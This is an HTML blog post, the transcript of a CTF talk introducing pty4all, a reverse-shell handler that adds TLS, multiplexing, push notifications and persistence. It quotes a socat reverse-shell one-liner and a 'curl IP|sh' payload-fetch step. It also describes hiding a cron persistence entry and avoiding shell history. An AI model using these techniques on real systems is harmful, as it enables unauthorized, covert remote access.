@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <script async src="/js/custom.js"></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5">
+<meta name="generator" content="Hugo 0.57.2" />
+
+    
+    
+    
+
+<title>pty4all - The shells you deserve • Think
+Love
+Share</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="pty4all - The shells you deserve"/>
+<meta name="twitter:description" content="I hope you like tooling, bash scripting, and uber-duper shells, because we&#39;re going to enhance the sad shells we had to happy automated, multiplexed, encrypted, fully interactive PTYs with push notification and automatic persistency!"/>
+
+<meta property="og:title" content="pty4all - The shells you deserve" />
+<meta property="og:description" content="I hope you like tooling, bash scripting, and uber-duper shells, because we&#39;re going to enhance the sad shells we had to happy automated, multiplexed, encrypted, fully interactive PTYs with push notification and automatic persistency!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thinkloveshare.com/hacking/pty4all_the_shells_you_deserve/" />
+<meta property="article:published_time" content="2022-01-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-01-29T00:00:00+00:00" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container sidebar-about ">
+      <span class="site__title">
+        <a href="https://thinkloveshare.com/">Think
+Love
+Share</a>
+      </span>
+          <a href="https://thinkloveshare.com/">
+          
+          
+          
+          <div class="author-image">
+            <img src="https://thinkloveshare.com/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+      <p class="site__description">
+        <a href="https://thinkloveshare.com/">
+         InfoSec, Code, Thoughts &amp; Feels 
+      </a>
+      </p>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/hacking/">
+						<span>Hacking</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/coding/">
+						<span>Coding</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/the_rest/">
+						<span>The Rest</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/travels/">
+						<span>Travels</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://github.com/Laluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://gitlab.com/TheLaluka" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+  
+</section>
+
+    </p>
+    <p class="copyright">
+      &copy; 2022 Laluka.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>pty4all - The shells you deserve</h1>
+    
+    
+<div class="post__meta">
+    
+      <i class="fas fa-calendar-alt"></i> Jan 29, 2022
+    
+    
+    <i class="fas fa-clock"></i> 8 min read
+    <i class="fas fa-globe"></i>
+    
+    Non traduit
+    
+    <br/> <i class="fas fa-heart"></i>Any typos? Any idea to suggest? Feedback appreciated!<i class="fas fa-heart"></i><br/>
+</div>
+
+
+  </header>
+  <hr/>
+  <div class="post">
+    
+
+<p>This article is the transcript of a talk I gave at the opening of the CTF platform TheBlackSide on 29th January 2022.</p>
+
+<p>Recording incoming ! :)</p>
+
+<p><a href="https://github.com/laluka/pty4all">https://github.com/laluka/pty4all</a></p>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="//www.youtube.com/embed/TODO" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<hr />
+
+<p><img class="img_full" src="png-01.png" alt="png-01"></p>
+
+<p>Hi there, long time no see! :)</p>
+
+<p>I hope you like tooling, bash scripting, and uber-duper shells, because we&rsquo;re going to <code>enhance the sad shells we had to happy automated multiplexed encrypted fully interactive PTYs with push notification and automatic persistency</code>!</p>
+
+<p>Hyped? I hope so. Lessgo!</p>
+
+<h1 id="1-types-of-shells">1. Types of shells</h1>
+
+<p>Why are we doing this anyway? Where do shells come from? What are they?</p>
+
+<p>Basically, there are two big families of shells, and many small enhancements (Yes, I&rsquo;ll omit webshells for now).</p>
+
+<p>The (arbitrary) first type of shell is the bind shell, when your newly spawned bash/sh/dash/zsh/*sh process waits for your connection on the remote host. Given there are no network restrictions, the attacker can then connect its input/output to the remote process input/output and use this tunnel to supply commands and read their outputs.</p>
+
+<p>This is nice, for sure, but it has a few inherent drawbacks. It needs to bind to a port, be reachable from the outer world (also named <code>the fucking internet</code>), and if you need to use ports below 1000 it needs a special bind privilege or to be run as root. It&rsquo;s ok for CTF tasks but in real life, it&rsquo;s hardly usable on any real targets because of network filtering. This is basically opening a world-accessible backdoor on your target. Meh.</p>
+
+<p><img class="img_full" src="png-03.png" alt="png-03"></p>
+
+<p>The second type of shell is a reverse shell. Now, the attacker will open a listener on their machine, and force the targeted server to both spawn a new bash (omitting variants) process and connect it with magical pipes to the attacker listener.</p>
+
+<p>It&rsquo;s much better, the production server isn&rsquo;t cracked open on the internet anymore! But for the reverse shell to work, it requires an allowed egress port (outgoing connections) from the remote server, which might be an issue on hardened servers or networks.</p>
+
+<p><img class="img_full" src="png-04.png" alt="png-04"></p>
+
+<p>In addition to all the issues mentioned previously, there are a few more that concern both types but can be improved, here&rsquo;s a non-exhaustive list:</p>
+
+<ul>
+<li>Plaintext exchanges, so easily detected</li>
+<li>Not password protected, exposes production to the internet jungle</li>
+<li>Won&rsquo;t handle signals by default and will break on Ctrl^C</li>
+<li>Can only handle one simultaneous connection</li>
+<li>No notification on spawned shell</li>
+<li>Etc, etc, etc.</li>
+</ul>
+
+<p>All these issues do have their own mitigation, but more features means more dependencies, more bugs, more chances of being detected, &hellip;</p>
+
+<p>Here&rsquo;s one minimalistic example that shows how to tackle one issue, encryption. The reverse shell can be built this way. A bash process that encodes its output and decodes its input with a specified encryption type with let&rsquo;s say openssl, and then communicates with the attacker using the bash <code>/dev/tcp/IP/PORT</code> builtin feature. On the attacker side, netcat can be used to listen, and openssl to encrypt the commands, and decrypt the results.</p>
+
+<p>It&rsquo;s one simple example that has MANY variants, just illustrating, y&rsquo;know..</p>
+
+<p>But it&rsquo;s still a basic shell, not providing much convenience. It&rsquo;s just some more commands, some more features.</p>
+
+<p><img class="img_full" src="png-05.png" alt="png-05"></p>
+
+<p>Now let&rsquo;s introduce one of my favorite tools, which I <code>really</code> wish I had known about earlier in my life. It&rsquo;s like a friend, just a bit less talkative.</p>
+
+<h1 id="2-why-i-socat">2. Why I ❤️ Socat</h1>
+
+<p>Socat can do MANY things for us, here are some of them:</p>
+
+<pre><code class="language-bash">curl cheat.sh/socat
+
+---
+tags [ networking ]
+---
+# socat connect to http-server (port 80 on 'butzel.info')
+socat TCP4:butzel.info:80 -
+
+# connect to https-server (port 443 on 'butzel.info' with tls)
+socat openssl:butzel.info:443 -
+
+# tcp-listener (port 3180), output as hexdump (-x) and fork for new connetions
+socat -x tcp-listen:3180,fork -
+
+# practical examples:
+
+# complete real working http-example:  
+#  (sleep is necessary to prevent socat closing socket before data received)
+(echo -e &quot;GET / HTTP/1.1\r\nHost: butzel.info\r\n\r&quot; &amp;&amp; sleep 1) \ 
+| socat tcp4:butzel.info:80 -
+
+# http to httpS 'Proxy' (for an webserver without TLS-Support)
+socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80
+
+# port forwarding (e.g. own port 3180 to port 22(ssh) on target
+socat TCP4-LISTEN:3180,reuseaddr,fork TCP4:butzel.info:ssh
+
+# TOR-forwarding (needs tor-daemon on port 9050 running)
+socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050
+
+# network (port 8266) to serial bridge (/dev/ttyUSB0 baudrate: 115200)
+socat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200
+
+# udp to tcp
+socat -u udp-recvfrom:1234,fork tcp:localhost:4321
+
+# reverse shell:
+socat exec:'bash -i',pty,stderr tcp:remote.butzel.info:3180
+
+# listener for above reverse shell (on remote.butzel.info):
+socat file:`tty`,raw,echo=0 tcp-listen:3180
+# or: nc -lp 3180
+
+ tldr:socat 
+# socat
+# Multipurpose relay (SOcket CAT).
+
+# Listen to a port, wait for an incoming connection and transfer data to STDIO:
+socat - TCP-LISTEN:8080,fork
+
+# Create a connection to a host and port, transfer data in STDIO to connected host:
+socat - TCP4:www.example.com:80
+
+# Forward incoming data of a local port to another host and port:
+socat TCP-LISTEN:80,fork TCP4:www.example.com:80
+</code></pre>
+
+<p>It&rsquo;s convenient, but how can these features help us for our uber-duper shell?</p>
+
+<ul>
+<li>It can allocate a PTY on both remote and attacking side, this means proper signal handling, autocompletion, ctrl^C, sudo interactions, resizing, inline editing (vim, htop, nano, &hellip;)</li>
+<li>It can encrypt with various protocols, including TLS which is less flagged than typical RC4 or AES encryption for malwares</li>
+<li>It can use UNIX sockets, so can easily be scripted and used with crazy bash kung-fu one-liners of D00M (damn I love bash kung-fu..)</li>
+<li>It can be statically compiled and cross compiled, implying it can virtually be used on any kind of remote target</li>
+<li>It&rsquo;s really simple to use, even more with cheat.sh in your toolbox, even moooore if you spend time in the man :)</li>
+<li>Last but not least, it contains the word <code>cat</code> in its name like netcat, or ncat, so it&rsquo;s a decent choice. For sure.</li>
+</ul>
+
+<p><img class="img_full" src="png-07.png" alt="png-07"></p>
+
+<p>Here&rsquo;s a minimalistic example for a listener and a reverse shell one-liner. This is all you need to have a fully interactive PTY. Convenient, isn&rsquo;t it?</p>
+
+<p><img class="img_full" src="png-08.png" alt="png-08"></p>
+
+<p>As said earlier, it can be easily cross-compiled, but you know what? You don&rsquo;t even have to cross-compile it as the <a href="https://github.com/minos-org/minos-static">minos-static</a> project provides premade static-build scripts and binaries! Just run <code>static-get -x socat</code> and WOOSH, you&rsquo;re good to go!</p>
+
+<p><img class="img_full" src="png-09.png" alt="png-09"></p>
+
+<h1 id="3-features-of-pty4all">3. Features of pty4all</h1>
+
+<p>Now that we have all the cards (tools) in our hand, let&rsquo;s complete the puzzle and create our purrfect reverse shell!</p>
+
+<p>I won&rsquo;t go through all the code as it&rsquo;s now open-source on github, but here is the main concept:</p>
+
+<ol>
+<li>The attacker starts a <code>tmux</code> session on their server, to be able to keep the listener open even if they disconnect. This works due to the daemon-based persistency tmux offers (one of my favorite feature for long-running tasks on vps)</li>
+<li>Then, they run <code>socat-multi-handler.sh</code> with the appropriate arguments to listen on the specified port and ip address.</li>
+<li>Under the hood, this script will:
+
+<ol>
+<li>Generate a TLS certificate and key for the socat pty handler.</li>
+<li>Serve over HTTP (on its default path) a second script that will be executed by the remote target in-memory. This second script will download a static socat from the attacker server, and connect to the attacker listener over TLS.</li>
+</ol></li>
+<li>Once this encrypted connection has been established, it&rsquo;ll then forward the connection to a UNIX socket that will hold the connection, and make the listener available again for new shells.</li>
+</ol>
+
+<p>There were two other features that I also needed (and thus added) which are:</p>
+
+<ul>
+<li>A push notification with <code>discord webhooks</code>, it&rsquo;s a simple curl so yes, it could be stealthier :)</li>
+<li>An automatic persistency payload that will use a trick with a comment and a &ldquo;line-clearer&rdquo; character to mimic an empty crontab. The newly added crontask will check every minute if the reverse shell is up, and spawn a new one if it died.</li>
+<li>No history should be logged as these commands are ran with prefixed spaces, which is a behavior that prevents standard shells from logging the issued commands</li>
+</ul>
+
+<p>That&rsquo;s it. We&rsquo;re done. Now, all the victim needs to execute is <code>curl IP|sh</code> and we&rsquo;re all set, feels like home ! ❤️❤️❤️</p>
+
+<p><img class="img_full" src="png-11.png" alt="png-11"></p>
+
+<h1 id="4-demo">4. Demo</h1>
+
+<p>All the words I can write are not worth a demo, so here it is.</p>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="//www.youtube.com/embed/TTEGIhvu7eQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<h1 id="5-future-improvements">5. Future improvements</h1>
+
+<p>Just like for every software, it&rsquo;ll probably never be &ldquo;finished&rdquo;, there&rsquo;s a lot of room for improvements. A few things are in mind for now:</p>
+
+<ul>
+<li>Support more architectures, x86, windows, arm, &hellip; Maybe with a golang (cross-compiles and obfuscated easily) client instead of socat on the victim-side?</li>
+<li>Host the payload with http AND https, but this would force us to use a longer payload, as curl uses http by default, thus requiring something like <code>curl https://IP:PORT|sh</code>. It&rsquo;s still ok but contains more badchars (colon and forward slashes)&hellip; Encryption has a success-rate cost :(</li>
+<li>Add more push-notification methods / services</li>
+<li>Add more persistancy options, like nohup, a while loop, process injection, and so on.</li>
+</ul>
+
+<blockquote>
+<p>Side note, if you wonder why I write down the text that&rsquo;s already in the slides, it&rsquo;s for some blind folks out-there and text-to-speech users that like to listen to articles instead of reading them. You&rsquo;re not a lot, but you&rsquo;re more than welcome here! ;)</p>
+</blockquote>
+
+<p><img class="img_full" src="png-15.png" alt="png-15"></p>
+
+<p>Annnd that&rsquo;s it for today!</p>
+
+<p>Thanks for reading, and/or listening if you were there for the talk!</p>
+
+<p>Now go on TheBlackSide, and for every pty you spawn, share this tool to someone new (hehe)! ;)</p>
+
+<p><a href="https://github.com/laluka/pty4all">https://github.com/laluka/pty4all</a></p>
+
+<p><img class="img_full" src="png-16.png" alt="png-16"></p>
+
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/hacking/failed02_pulse_secure_vpn_guacamole_websocket_hooking/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Failed02 Pulse Secure VPN and Guacamole WebSocket Hooking</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-128985075-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
